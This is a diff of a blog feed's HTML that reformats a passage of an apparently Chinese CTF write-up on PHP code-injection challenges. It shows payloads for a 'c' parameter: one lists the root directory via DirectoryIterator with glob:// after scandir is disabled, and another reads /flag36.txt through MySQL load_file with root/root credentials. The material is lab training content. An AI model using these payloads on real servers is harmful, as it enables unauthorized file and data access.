@@ -52,21 +52,7 @@
 <p>scandir被禁用,使用DirectoryIterator类</p>
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $key=&gt;$value)&#123;echo $key.&quot;=&gt;&quot;.$value;&#125;;exit(0);?&gt;</span><br></pre></td></tr></table></figure>
-```<blockquote>
-<p>用sql语句读取数据库文件<br>  c=<br>  try {</p>
-<pre><code>      $dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;,
-          &#39;root&#39;);
-</code></pre>
-</blockquote>
-<pre><code>      foreach ($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row) &#123;
-          echo ($row[0]) . &quot;|&quot;;
-      &#125;
-      $dbh = null;
-</code></pre>
-  } catch (PDOException $e) {<pre><code>      echo $e-&gt;getMessage();
-      exit(0);
-</code></pre>
-  }<br>  exit(0);</li>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; 用sql语句读取数据库文件</span><br><span class="line">```php</span><br><span class="line">c=</span><br><span class="line">try &#123;</span><br><span class="line">$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);</span><br><span class="line">foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">echo $e-&gt;getMessage();</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure></li>
 </ul>
 ]]></content>
       <categories>
